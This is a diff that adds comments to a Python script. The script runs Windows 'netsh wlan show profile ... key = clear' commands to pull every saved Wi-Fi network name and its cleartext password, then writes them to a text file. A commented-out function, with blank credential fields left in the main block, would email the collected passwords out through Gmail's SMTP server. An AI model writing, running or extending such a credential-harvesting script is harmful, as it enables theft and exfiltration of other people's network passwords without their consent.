@@ -2,7 +2,7 @@ import subprocess
 import re
 import smtplib
 
-
+# get the wifi name on a window machine using "netsh wlan show profile " command , and extract the name using python re "
 def get_wifi():
     parse_names = subprocess.run('netsh wlan show profile', shell=True, capture_output=True)
     if parse_names.returncode == 0:
@@ -14,7 +14,7 @@ def get_wifi():
     else:
         return False
 
-
+# key = clear
 def keyclear(wifi):
     command = f'netsh wlan show profile {wifi} key = clear'
     run = subprocess.run(command, shell=True, capture_output=True)
@@ -23,7 +23,7 @@ def keyclear(wifi):
     else:
         return False
 
-
+# extract the password using re
 def extract_password():
     wif_names = get_wifi()
     pass_dic = {}
@@ -36,14 +36,14 @@ def extract_password():
 
     return pass_dic
 
-
+#write the extract content inside a file
 def write_file():
     with open('wifi_password.txt', 'w') as f:
         for key, value in extract_password().items():
             content = f'{key} : {value} \n'
             f.write(content)
 
-
+#convert the dict to string
 # def to_string():
 #     content = ''' '''
 #     for key, value in extract_password().items():
@@ -52,6 +52,8 @@ def write_file():
 #     return content
 #
 
+
+# send email
 # def send_email(email , password,to):
 #     content = to_string()
 #     server = smtplib.SMTP('smtp.gmail.com',578)
@@ -62,7 +64,7 @@ def write_file():
 
 
 if __name__ == '__main__':
-    email = ''
-    password = ''
-    to = ''
+    email = '' #from email
+    password = '' # password
+    to = '' # to email
     write_file()
